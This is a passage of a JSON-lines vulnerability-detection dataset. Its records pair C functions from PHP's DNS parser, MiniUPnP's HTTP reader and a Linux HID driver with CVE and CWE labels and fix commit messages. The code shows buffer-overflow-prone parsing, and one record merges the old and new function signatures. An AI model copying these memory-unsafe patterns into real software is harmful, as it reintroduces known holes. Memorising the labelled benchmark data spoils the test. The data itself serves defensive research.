else if (!in_v6_break) {\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t\ttp[0] = '0';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tcp++;\n\t\t\t}\n\t\t\tfor (i = (n + 8) / 16; i < 8; i++) {\n\t\t\t\tGETSHORT(s, cp);\n\t\t\t\tif (s != 0) {\n\t\t\t\t\tif (tp > (u_char *)name) {\n\t\t\t\t\t\tin_v6_break = 0;\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t}\n\t\t\t\t\ttp += sprintf((char*)tp,\"%x\",s);\n\t\t\t\t} else {\n\t\t\t\t\tif (!have_v6_break) {\n\t\t\t\t\t\thave_v6_break = 1;\n\t\t\t\t\t\tin_v6_break = 1;\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t} else if (!in_v6_break) {\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t\ttp[0] = '0';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (have_v6_break && in_v6_break) {\n\t\t\t\ttp[0] = ':';\n\t\t\t\ttp++;\n\t\t\t}\n\t\t\ttp[0] = '\\0';\n\t\t\tadd_assoc_string(*subarray, \"ipv6\", name, 1);\n\t\t\tif (cp < p + dlen) {\n\t\t\t\tn = dn_expand(answer->qb2, answer->qb2+65536, cp, name, (sizeof name) - 2);\n\t\t\t\tif (n < 0) {\n\t\t\t\t\treturn NULL;\n\t\t\t\t}\n\t\t\t\tcp += n;\n\t\t\t\tadd_assoc_string(*subarray, \"chain\", name, 1);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase DNS_T_SRV:\n\t\t\tadd_assoc_string(*subarray, \"type\", \"SRV\", 1);\n\t\t\tGETSHORT(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"pri\", n);\n\t\t\tGETSHORT(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"weight\", n);\n\t\t\tGETSHORT(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"port\", n);\n\t\t\tn = dn_expand(answer->qb2, answer->qb2+65536, cp, name, (sizeof name) - 2);\n\t\t\tif (n < 0) {\n\t\t\t\treturn NULL;\n\t\t\t}\n\t\t\tcp += n;\n\t\t\tadd_assoc_string(*subarray, \"target\", name, 1);\n\t\t\tbreak;\n\t\tcase DNS_T_NAPTR:\n\t\t\tadd_assoc_string(*subarray, \"type\", \"NAPTR\", 1);\n\t\t\tGETSHORT(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"order\", n);\n\t\t\tGETSHORT(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"pref\", n);\n\t\t\tn = (cp[0] & 0xFF);\n\t\t\tadd_assoc_stringl(*subarray, \"flags\", (char*)++cp, n, 1);\n\t\t\tcp += n;\n\t\t\tn = (cp[0] & 0xFF);\n\t\t\tadd_assoc_stringl(*subarray, \"services\", (char*)++cp, n, 1);\n\t\t\tcp += n;\n\t\t\tn = (cp[0] & 0xFF);\n\t\t\tadd_assoc_stringl(*subarray, \"regex\", (char*)++cp, n, 1);\n\t\t\tcp += n;\n\t\t\tn = dn_expand(answer->qb2, answer->qb2+65536, cp, name, (sizeof name) - 2);\n\t\t\tif (n < 0) {\n\t\t\t\treturn NULL;\n\t\t\t}\n\t\t\tcp += n;\n\t\t\tadd_assoc_string(*subarray, \"replacement\", name, 1);\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tzval_ptr_dtor(subarray);\n\t\t\t*subarray = NULL;\n\t\t\tcp += dlen;\n\t\t\tbreak;\n\t}\n\n\treturn cp;\n}\n", "func_hash": 42082954493828007775750322427269807585, "file_name": "dns.c", "file_hash": 226180146173155591083703597054314681623, "cwe": ["CWE-119"], "cve": "CVE-2014-4049", "cve_desc": "Heap-based buffer overflow in the php_parserr function in ext/standard/dns.c in PHP 5.6.0beta4 and earlier allows remote servers to cause a denial of service (crash) and possibly execute arbitrary code via a crafted DNS TXT record, related to the dns_get_record function.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-4049"}
{"idx": 159007, "project": "miniupnp", "commit_id": "3a87aa2f10bd7f1408e1849bdb59c41dd63a9fe9", "project_url": "https://github.com/miniupnp/miniupnp", "commit_url": "https://github.com/miniupnp/miniupnp/commit/3a87aa2f10bd7f1408e1849bdb59c41dd63a9fe9", "commit_message": "miniwget.c: fixed potential buffer overrun", "target": 0, "func": "getHTTPResponse(int s, int * size)\n{\n\tchar buf[2048];\n\tint n;\n\tint endofheaders = 0;\n\tint chunked = 0;\n\tint content_length = -1;\n\tunsigned int chunksize = 0;\n\tunsigned int bytestocopy = 0;\n\t/* buffers : */\n\tchar * header_buf;\n\tunsigned int header_buf_len = 2048;\n\tunsigned int header_buf_used = 0;\n\tchar * content_buf;\n\tunsigned int content_buf_len = 2048;\n\tunsigned int content_buf_used = 0;\n\tchar chunksize_buf[32];\n\tunsigned int chunksize_buf_index;\n\n\theader_buf = malloc(header_buf_len);\n\tcontent_buf = malloc(content_buf_len);\n\tchunksize_buf[0] = '\\0';\n\tchunksize_buf_index = 0;\n\n\twhile((n = receivedata(s, buf, 2048, 5000, NULL)) > 0)\n\t{\n\t\tif(endofheaders == 0)\n\t\t{\n\t\t\tint i;\n\t\t\tint linestart=0;\n\t\t\tint colon=0;\n\t\t\tint valuestart=0;\n\t\t\tif(header_buf_used + n > header_buf_len) {\n\t\t\t\theader_buf = realloc(header_buf, header_buf_used + n);\n\t\t\t\theader_buf_len = header_buf_used + n;\n\t\t\t}\n\t\t\tmemcpy(header_buf + header_buf_used, buf, n);\n\t\t\theader_buf_used += n;\n\t\t\t/* search for CR LF CR LF (end of headers)\n\t\t\t * recognize also LF LF */\n\t\t\ti = 0;\n\t\t\twhile(i < ((int)header_buf_used-1) && (endofheaders == 0)) {\n\t\t\t\tif(header_buf[i] == '\\r') {\n\t\t\t\t\ti++;\n\t\t\t\t\tif(header_buf[i] == '\\n') {\n\t\t\t\t\t\ti++;\n\t\t\t\t\t\tif(i < (int)header_buf_used && header_buf[i] == '\\r') {\n\t\t\t\t\t\t\ti++;\n\t\t\t\t\t\t\tif(i < (int)header_buf_used && header_buf[i] == '\\n') {\n\t\t\t\t\t\t\t\tendofheaders = i+1;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t} else if(header_buf[i] == '\\n') {\n\t\t\t\t\ti++;\n\t\t\t\t\tif(header_buf[i] == '\\n') {\n\t\t\t\t\t\tendofheaders = i+1;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\ti++;\n\t\t\t}\n\t\t\tif(endofheaders == 0)\n\t\t\t\tcontinue;\n\t\t\t/* parse header lines */\n\t\t\tfor(i = 0; i < endofheaders - 1; i++) {\n\t\t\t\tif(colon <= linestart && header_buf[i]==':')\n\t\t\t\t{\n\t\t\t\t\tcolon = i;\n\t\t\t\t\twhile(i < (endofheaders-1)\n\t\t\t\t\t      && (header_buf[i+1] == ' ' || header_buf[i+1] == '\\t'))\n\t\t\t\t\t\ti++;\n\t\t\t\t\tvaluestart = i + 1;\n\t\t\t\t}\n\t\t\t\t/* detecting end of line */\n\t\t\t\telse if(header_buf[i]=='\\r' || header_buf[i]=='\\n')\n\t\t\t\t{\n\t\t\t\t\tif(colon > linestart && valuestart > colon)\n\t\t\t\t\t{\n#ifdef DEBUG\n\t\t\t\t\t\tprintf(\"header='%.*s', value='%.*s'\\n\",\n\t\t\t\t\t\t       colon-linestart, header_buf+linestart,\n\t\t\t\t\t\t       i-valuestart, header_buf+valuestart);\n#endif\n\t\t\t\t\t\tif(0==strncasecmp(header_buf+linestart, \"content-length\", colon-linestart))\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tcontent_length = atoi(header_buf+valuestart);\n#ifdef DEBUG\n\t\t\t\t\t\t\tprintf(\"Content-Length: %d\\n\", content_length);\n#endif\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse if(0==strncasecmp(header_buf+linestart, \"transfer-encoding\", colon-linestart)\n\t\t\t\t\t\t   && 0==strncasecmp(header_buf+valuestart, \"chunked\", 7))\n\t\t\t\t\t\t{\n#ifdef DEBUG\n\t\t\t\t\t\t\tprintf(\"chunked transfer-encoding!\\n\");\n#endif\n \t\t\t\t\t\t\tchunked = 1;\n \t\t\t\t\t\t}\n \t\t\t\t\t}\n\t\t\t\t\twhile((i < (int)header_buf_used) && (header_buf[i]=='\\r' || header_buf[i] == '\\n'))\n \t\t\t\t\t\ti++;\n \t\t\t\t\tlinestart = i;\n \t\t\t\t\tcolon = linestart;\n\t\t\t\t\tvaluestart = 0;\n\t\t\t\t}\n\t\t\t}\n\t\t\t/* copy the remaining of the received data back to buf */\n\t\t\tn = header_buf_used - endofheaders;\n\t\t\tmemcpy(buf, header_buf + endofheaders, n);\n\t\t\t/* if(headers) */\n\t\t}\n\t\tif(endofheaders)\n\t\t{\n\t\t\t/* content */\n\t\t\tif(chunked)\n\t\t\t{\n\t\t\t\tint i = 0;\n\t\t\t\twhile(i < n)\n\t\t\t\t{\n\t\t\t\t\tif(chunksize == 0)\n\t\t\t\t\t{\n\t\t\t\t\t\t/* reading chunk size */\n\t\t\t\t\t\tif(chunksize_buf_index == 0) {\n\t\t\t\t\t\t\t/* skipping any leading CR LF */\n\t\t\t\t\t\t\tif(i<n && buf[i] == '\\r') i++;\n\t\t\t\t\t\t\tif(i<n && buf[i] == '\\n') i++;\n\t\t\t\t\t\t}\n\t\t\t\t\t\twhile(i<n && isxdigit(buf[i])\n\t\t\t\t\t\t     && chunksize_buf_index < (sizeof(chunksize_buf)-1))\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tchunksize_buf[chunksize_buf_index++] = buf[i];\n\t\t\t\t\t\t\tchunksize_buf[chunksize_buf_index] = '\\0';\n\t\t\t\t\t\t\ti++;\n\t\t\t\t\t\t}\n\t\t\t\t\t\twhile(i<n && buf[i] != '\\r' && buf[i] != '\\n')\n\t\t\t\t\t\t\ti++; /* discarding chunk-extension */\n\t\t\t\t\t\tif(i<n && buf[i] == '\\r') i++;\n\t\t\t\t\t\tif(i<n && buf[i] == '\\n') {\n\t\t\t\t\t\t\tunsigned int j;\n\t\t\t\t\t\t\tfor(j = 0; j < chunksize_buf_index; j++) {\n\t\t\t\t\t\t\tif(chunksize_buf[j] >= '0'\n\t\t\t\t\t\t\t   && chunksize_buf[j] <= '9')\n\t\t\t\t\t\t\t\tchunksize = (chunksize << 4) + (chunksize_buf[j] - '0');\n\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\tchunksize = (chunksize << 4) + ((chunksize_buf[j] | 32) - 'a' + 10);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tchunksize_buf[0] = '\\0';\n\t\t\t\t\t\t\tchunksize_buf_index = 0;\n\t\t\t\t\t\t\ti++;\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t/* not finished to get chunksize */\n\t\t\t\t\t\t\tcontinue;\n\t\t\t\t\t\t}\n#ifdef DEBUG\n\t\t\t\t\t\tprintf(\"chunksize = %u (%x)\\n\", chunksize, chunksize);\n#endif\n\t\t\t\t\t\tif(chunksize == 0)\n\t\t\t\t\t\t{\n#ifdef DEBUG\n\t\t\t\t\t\t\tprintf(\"end of HTTP content - %d %d\\n\", i, n);\n\t\t\t\t\t\t\t/*printf(\"'%.*s'\\n\", n-i, buf+i);*/\n#endif\n\t\t\t\t\t\t\tgoto end_of_stream;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tbytestocopy = ((int)chunksize < (n - i))?chunksize:(unsigned int)(n - i);\n\t\t\t\t\tif((content_buf_used + bytestocopy) > content_buf_len)\n\t\t\t\t\t{\n\t\t\t\t\t\tif(content_length >= (int)(content_buf_used + bytestocopy)) {\n\t\t\t\t\t\t\tcontent_buf_len = content_length;\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\tcontent_buf_len = content_buf_used + bytestocopy;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tcontent_buf = (char *)realloc((void *)content_buf,\n\t\t\t\t\t\t                              content_buf_len);\n\t\t\t\t\t}\n\t\t\t\t\tmemcpy(content_buf + content_buf_used, buf + i, bytestocopy);\n\t\t\t\t\tcontent_buf_used += bytestocopy;\n\t\t\t\t\ti += bytestocopy;\n\t\t\t\t\tchunksize -= bytestocopy;\n\t\t\t\t}\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\t/* not chunked */\n\t\t\t\tif(content_length > 0\n\t\t\t\t   && (int)(content_buf_used + n) > content_length) {\n\t\t\t\t\t/* skipping additional bytes */\n\t\t\t\t\tn = content_length - content_buf_used;\n\t\t\t\t}\n\t\t\t\tif(content_buf_used + n > content_buf_len)\n\t\t\t\t{\n\t\t\t\t\tif(content_length >= (int)(content_buf_used + n)) {\n\t\t\t\t\t\tcontent_buf_len = content_length;\n\t\t\t\t\t} else {\n\t\t\t\t\t\tcontent_buf_len = content_buf_used + n;\n\t\t\t\t\t}\n\t\t\t\t\tcontent_buf = (char *)realloc((void *)content_buf,\n\t\t\t\t\t                              content_buf_len);\n\t\t\t\t}\n\t\t\t\tmemcpy(content_buf + content_buf_used, buf, n);\n\t\t\t\tcontent_buf_used += n;\n\t\t\t}\n\t\t}\n\t\t/* use the Content-Length header value if available */\n\t\tif(content_length > 0 && (int)content_buf_used >= content_length)\n\t\t{\n#ifdef DEBUG\n\t\t\tprintf(\"End of HTTP content\\n\");\n#endif\n\t\t\tbreak;\n\t\t}\n\t}\nend_of_stream:\n\tfree(header_buf); header_buf = NULL;\n\t*size = content_buf_used;\n\tif(content_buf_used == 0)\n\t{\n\t\tfree(content_buf);\n\t\tcontent_buf = NULL;\n\t}\n\treturn content_buf;\n}\n", "func_hash": 331237893839884767142201326630204450580, "file_name": "miniwget.c", "file_hash": 168853020666456570587818425677132049522, "cwe": ["CWE-119"], "cve": "CVE-2014-3985", "cve_desc": "The getHTTPResponse function in miniwget.c in MiniUPnP 1.9 allows remote attackers to cause a denial of service (crash) via crafted headers that trigger an out-of-bounds read.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-3985"}
{"idx": 159018, "project": "php-src", "commit_id": "2fefae47716d501aec41c1102f3fd4531f070b05", "project_url": "https://github.com/php/php-src", "commit_url": "https://github.com/php/php-src/commit/2fefae47716d501aec41c1102f3fd4531f070b05", "commit_message": "Fixed Sec Bug #67717 segfault in dns_get_record CVE-2014-3597\n\nIncomplete fix for CVE-2014-4049\n\nCheck possible buffer overflow\n- pass real buffer end to dn_expand calls\n- check buffer len before each read", "target": 0, "func": "static u_char *php_parserr(u_char *cp, querybuf *answer, int type_to_fetch, int store, int raw, zval **subarray)\nstatic u_char *php_parserr(u_char *cp, u_char *end, querybuf *answer, int type_to_fetch, int store, int raw, zval **subarray)\n {\n \tu_short type, class, dlen;\n \tu_long ttl;\n\tlong n, i;\n\tu_short s;\n\tu_char *tp, *p;\n\tchar name[MAXHOSTNAMELEN];\n\tint have_v6_break = 0, in_v6_break = 0;\n \n \t*subarray = NULL;\n \n\tn = dn_expand(answer->qb2, end, cp, name, sizeof(name) - 2);\n \tif (n < 0) {\n \t\treturn NULL;\n \t}\n \tcp += n;\n \n\tCHECKCP(10);\n \tGETSHORT(type, cp);\n \tGETSHORT(class, cp);\n \tGETLONG(ttl, cp);\n \tGETSHORT(dlen, cp);\n\tCHECKCP(dlen);\n \tif (type_to_fetch != T_ANY && type != type_to_fetch) {\n \t\tcp += dlen;\n \t\treturn cp;\n\t}\n\n\tif (!store) {\n\t\tcp += dlen;\n\t\treturn cp;\n\t}\n\n\tALLOC_INIT_ZVAL(*subarray);\n\tarray_init(*subarray);\n\n\tadd_assoc_string(*subarray, \"host\", name, 1);\n\tadd_assoc_string(*subarray, \"class\", \"IN\", 1);\n\tadd_assoc_long(*subarray, \"ttl\", ttl);\n\n\tif (raw) {\n\t\tadd_assoc_long(*subarray, \"type\", type);\n\t\tadd_assoc_stringl(*subarray, \"data\", (char*) cp, (uint) dlen, 1);\n\t\tcp += dlen;\n\t\treturn cp;\n\t}\n \n \tswitch (type) {\n \t\tcase DNS_T_A:\n\t\t\tCHECKCP(4);\n \t\t\tadd_assoc_string(*subarray, \"type\", \"A\", 1);\n \t\t\tsnprintf(name, sizeof(name), \"%d.%d.%d.%d\", cp[0], cp[1], cp[2], cp[3]);\n \t\t\tadd_assoc_string(*subarray, \"ip\", name, 1);\n \t\t\tcp += dlen;\n \t\t\tbreak;\n \t\tcase DNS_T_MX:\n\t\t\tCHECKCP(2);\n \t\t\tadd_assoc_string(*subarray, \"type\", \"MX\", 1);\n \t\t\tGETSHORT(n, cp);\n \t\t\tadd_assoc_long(*subarray, \"pri\", n);\n\t\t\t/* no break; */\n\t\tcase DNS_T_CNAME:\n\t\t\tif (type == DNS_T_CNAME) {\n\t\t\t\tadd_assoc_string(*subarray, \"type\", \"CNAME\", 1);\n\t\t\t}\n\t\t\t/* no break; */\n\t\tcase DNS_T_NS:\n\t\t\tif (type == DNS_T_NS) {\n\t\t\t\tadd_assoc_string(*subarray, \"type\", \"NS\", 1);\n\t\t\t}\n\t\t\t/* no break; */\n\t\tcase DNS_T_PTR:\n \t\t\tif (type == DNS_T_PTR) {\n \t\t\t\tadd_assoc_string(*subarray, \"type\", \"PTR\", 1);\n \t\t\t}\n\t\t\tn = dn_expand(answer->qb2, end, cp, name, (sizeof name) - 2);\n \t\t\tif (n < 0) {\n \t\t\t\treturn NULL;\n \t\t\t}\n\t\t\tcp += n;\n\t\t\tadd_assoc_string(*subarray, \"target\", name, 1);\n\t\t\tbreak;\n \t\tcase DNS_T_HINFO:\n \t\t\t/* See RFC 1010 for values */\n \t\t\tadd_assoc_string(*subarray, \"type\", \"HINFO\", 1);\n\t\t\tCHECKCP(1);\n \t\t\tn = *cp & 0xFF;\n \t\t\tcp++;\n\t\t\tCHECKCP(n);\n \t\t\tadd_assoc_stringl(*subarray, \"cpu\", (char*)cp, n, 1);\n \t\t\tcp += n;\n\t\t\tCHECKCP(1);\n \t\t\tn = *cp & 0xFF;\n \t\t\tcp++;\n\t\t\tCHECKCP(n);\n \t\t\tadd_assoc_stringl(*subarray, \"os\", (char*)cp, n, 1);\n \t\t\tcp += n;\n \t\t\tbreak;\n \t\tcase DNS_T_TXT:\n \t\t\t{\n\t\t\t\tint l1 = 0, l2 = 0;\n \t\t\t\tzval *entries = NULL;\n \n \t\t\t\tadd_assoc_string(*subarray, \"type\", \"TXT\", 1);\n\t\t\t\ttp = emalloc(dlen + 1);\n\t\t\t\t\n \t\t\t\tMAKE_STD_ZVAL(entries);\n \t\t\t\tarray_init(entries);\n \t\t\t\t\n\t\t\t\twhile (l1 < dlen) {\n\t\t\t\t\tn = cp[l1];\n\t\t\t\t\tif ((l1 + n) >= dlen) {\n\t\t\t\t\t\tn = dlen - (l1 + 1);\n\t\t\t\t\t}\n\t\t\t\t\tif (n) {\n\t\t\t\t\t\tmemcpy(tp + l2 , cp + l1 + 1, n);\n\t\t\t\t\t\tadd_next_index_stringl(entries, cp + l1 + 1, n, 1);\n \t\t\t\t\t}\n\t\t\t\t\tl1 = l1 + n + 1;\n\t\t\t\t\tl2 = l2 + n;\n \t\t\t\t}\n\t\t\t\ttp[l2] = '\\0';\n \t\t\t\tcp += dlen;\n \n\t\t\t\tadd_assoc_stringl(*subarray, \"txt\", tp, l2, 0);\n \t\t\t\tadd_assoc_zval(*subarray, \"entries\", entries);\n \t\t\t}\n \t\t\tbreak;\n \t\tcase DNS_T_SOA:\n \t\t\tadd_assoc_string(*subarray, \"type\", \"SOA\", 1);\n\t\t\tn = dn_expand(answer->qb2, end, cp, name, (sizeof name) -2);\n \t\t\tif (n < 0) {\n \t\t\t\treturn NULL;\n \t\t\t}\n \t\t\tcp += n;\n \t\t\tadd_assoc_string(*subarray, \"mname\", name, 1);\n\t\t\tn = dn_expand(answer->qb2, end, cp, name, (sizeof name) -2);\n \t\t\tif (n < 0) {\n \t\t\t\treturn NULL;\n \t\t\t}\n \t\t\tcp += n;\n \t\t\tadd_assoc_string(*subarray, \"rname\", name, 1);\n\t\t\tCHECKCP(5*4);\n \t\t\tGETLONG(n, cp);\n \t\t\tadd_assoc_long(*subarray, \"serial\", n);\n \t\t\tGETLONG(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"refresh\", n);\n\t\t\tGETLONG(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"retry\", n);\n\t\t\tGETLONG(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"expire\", n);\n\t\t\tGETLONG(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"minimum-ttl\", n);\n \t\t\tbreak;\n \t\tcase DNS_T_AAAA:\n \t\t\ttp = (u_char*)name;\n\t\t\tCHECKCP(8*2);\n \t\t\tfor(i=0; i < 8; i++) {\n \t\t\t\tGETSHORT(s, cp);\n \t\t\t\tif (s != 0) {\n\t\t\t\t\tif (tp > (u_char *)name) {\n\t\t\t\t\t\tin_v6_break = 0;\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t}\n\t\t\t\t\ttp += sprintf((char*)tp,\"%x\",s);\n\t\t\t\t} else {\n\t\t\t\t\tif (!have_v6_break) {\n\t\t\t\t\t\thave_v6_break = 1;\n\t\t\t\t\t\tin_v6_break = 1;\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t} else if (!in_v6_break) {\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t\ttp[0] = '0';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (have_v6_break && in_v6_break) {\n\t\t\t\ttp[0] = ':';\n\t\t\t\ttp++;\n\t\t\t}\n\t\t\ttp[0] = '\\0';\n\t\t\tadd_assoc_string(*subarray, \"type\", \"AAAA\", 1);\n\t\t\tadd_assoc_string(*subarray, \"ipv6\", name, 1);\n\t\t\tbreak;\n \t\tcase DNS_T_A6:\n \t\t\tp = cp;\n \t\t\tadd_assoc_string(*subarray, \"type\", \"A6\", 1);\n\t\t\tCHECKCP(1);\n \t\t\tn = ((int)cp[0]) & 0xFF;\n \t\t\tcp++;\n \t\t\tadd_assoc_long(*subarray, \"masklen\", n);\n\t\t\ttp = (u_char*)name;\n\t\t\tif (n > 15) {\n\t\t\t\thave_v6_break = 1;\n\t\t\t\tin_v6_break = 1;\n\t\t\t\ttp[0] = ':';\n\t\t\t\ttp++;\n\t\t\t}\n\t\t\tif (n % 16 > 8) {\n\t\t\t\t/* Partial short */\n\t\t\t\tif (cp[0] != 0) {\n\t\t\t\t\tif (tp > (u_char *)name) {\n\t\t\t\t\t\tin_v6_break = 0;\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t}\n\t\t\t\t\tsprintf((char*)tp, \"%x\", cp[0] & 0xFF);\n\t\t\t\t} else {\n\t\t\t\t\tif (!have_v6_break) {\n\t\t\t\t\t\thave_v6_break = 1;\n\t\t\t\t\t\tin_v6_break = 1;\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t} else if (!in_v6_break) {\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t\ttp[0] = '0';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t}\n\t\t\t\t}\n \t\t\t\tcp++;\n \t\t\t}\n \t\t\tfor (i = (n + 8) / 16; i < 8; i++) {\n\t\t\t\tCHECKCP(2);\n \t\t\t\tGETSHORT(s, cp);\n \t\t\t\tif (s != 0) {\n \t\t\t\t\tif (tp > (u_char *)name) {\n\t\t\t\t\t\tin_v6_break = 0;\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t}\n\t\t\t\t\ttp += sprintf((char*)tp,\"%x\",s);\n\t\t\t\t} else {\n\t\t\t\t\tif (!have_v6_break) {\n\t\t\t\t\t\thave_v6_break = 1;\n\t\t\t\t\t\tin_v6_break = 1;\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t} else if (!in_v6_break) {\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t\ttp[0] = '0';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (have_v6_break && in_v6_break) {\n\t\t\t\ttp[0] = ':';\n\t\t\t\ttp++;\n\t\t\t}\n \t\t\ttp[0] = '\\0';\n \t\t\tadd_assoc_string(*subarray, \"ipv6\", name, 1);\n \t\t\tif (cp < p + dlen) {\n\t\t\t\tn = dn_expand(answer->qb2, end, cp, name, (sizeof name) - 2);\n \t\t\t\tif (n < 0) {\n \t\t\t\t\treturn NULL;\n \t\t\t\t}\n\t\t\t\tcp += n;\n\t\t\t\tadd_assoc_string(*subarray, \"chain\", name, 1);\n \t\t\t}\n \t\t\tbreak;\n \t\tcase DNS_T_SRV:\n\t\t\tCHECKCP(3*2);\n \t\t\tadd_assoc_string(*subarray, \"type\", \"SRV\", 1);\n \t\t\tGETSHORT(n, cp);\n \t\t\tadd_assoc_long(*subarray, \"pri\", n);\n \t\t\tGETSHORT(n, cp);\n \t\t\tadd_assoc_long(*subarray, \"weight\", n);\n \t\t\tGETSHORT(n, cp);\n \t\t\tadd_assoc_long(*subarray, \"port\", n);\n\t\t\tn = dn_expand(answer->qb2, end, cp, name, (sizeof name) - 2);\n \t\t\tif (n < 0) {\n \t\t\t\treturn NULL;\n \t\t\t}\n \t\t\tcp += n;\n \t\t\tadd_assoc_string(*subarray, \"target\", name, 1);\n \t\t\tbreak;\n \t\tcase DNS_T_NAPTR:\n\t\t\tCHECKCP(2*2);\n \t\t\tadd_assoc_string(*subarray, \"type\", \"NAPTR\", 1);\n \t\t\tGETSHORT(n, cp);\n \t\t\tadd_assoc_long(*subarray, \"order\", n);\n \t\t\tGETSHORT(n, cp);\n \t\t\tadd_assoc_long(*subarray, \"pref\", n);\n\n\t\t\tCHECKCP(1);\n \t\t\tn = (cp[0] & 0xFF);\n\t\t\tcp++;\n\t\t\tCHECKCP(n);\n\t\t\tadd_assoc_stringl(*subarray, \"flags\", (char*)cp, n, 1);\n \t\t\tcp += n;\n\n\t\t\tCHECKCP(1);\n \t\t\tn = (cp[0] & 0xFF);\n\t\t\tcp++;\n\t\t\tCHECKCP(n);\n\t\t\tadd_assoc_stringl(*subarray, \"services\", (char*)cp, n, 1);\n \t\t\tcp += n;\n\n\t\t\tCHECKCP(1);\n \t\t\tn = (cp[0] & 0xFF);\n\t\t\tcp++;\n\t\t\tCHECKCP(n);\n\t\t\tadd_assoc_stringl(*subarray, \"regex\", (char*)cp, n, 1);\n \t\t\tcp += n;\n\n\t\t\tn = dn_expand(answer->qb2, end, cp, name, (sizeof name) - 2);\n \t\t\tif (n < 0) {\n \t\t\t\treturn NULL;\n \t\t\t}\n\t\t\tcp += n;\n\t\t\tadd_assoc_string(*subarray, \"replacement\", name, 1);\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tzval_ptr_dtor(subarray);\n\t\t\t*subarray = NULL;\n\t\t\tcp += dlen;\n\t\t\tbreak;\n\t}\n\n\treturn cp;\n}\n", "func_hash": 192548275441720818685588113727947464793, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2014-3597", "cve_desc": "Multiple buffer overflows in the php_parserr function in ext/standard/dns.c in PHP before 5.4.32 and 5.5.x before 5.5.16 allow remote DNS servers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted DNS record, related to the dns_get_record function and the dn_expand function.  NOTE: this issue exists because of an incomplete fix for CVE-2014-4049.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-3597"}
{"idx": 159024, "project": "linux", "commit_id": "844817e47eef14141cf59b8d5ac08dd11c0a9189", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/844817e47eef14141cf59b8d5ac08dd11c0a9189", "commit_message": "HID: picolcd: sanity check report size in raw_event() callback\n\nThe report passed to us from transport driver could potentially be\narbitrarily large, therefore we better sanity-check it so that raw_data\nthat we hold in picolcd_pending structure are always kept within proper\nbounds.\n\nCc: stable@vger.kernel.org\nReported-by: Steven Vittitoe <scvitti@google.com>\nSigned-off-by: Jiri Kosina <jkosina@suse.cz>", "target": 0, "func": "static int picolcd_raw_event(struct hid_device *hdev,\n\t\tstruct hid_report *report, u8 *raw_data, int size)\n{\n\tstruct picolcd_data *data = hid_get_drvdata(hdev);\n\tunsigned long flags;\n\tint ret = 0;\n\n \tif (!data)\n \t\treturn 1;\n \n\tif (size > 64) {\n\t\thid_warn(hdev, \"invalid size value (%d) for picolcd raw event\\n\",\n\t\t\t\tsize);\n\t\treturn 0;\n\t}\n\n \tif (report->id == REPORT_KEY_STATE) {\n \t\tif (data->input_keys)\n \t\t\tret = picolcd_raw_keypad(data, report, raw_data+1, size-1);\n\t} else if (report->id == REPORT_IR_DATA) {\n\t\tret = picolcd_raw_cir(data, report, raw_data+1, size-1);\n\t} else {\n\t\tspin_lock_irqsave(&data->lock, flags);\n\t\t/*\n\t\t * We let the caller of picolcd_send_and_wait() check if the\n\t\t * report we got is one of the expected ones or not.\n\t\t */\n\t\tif (data->pending) 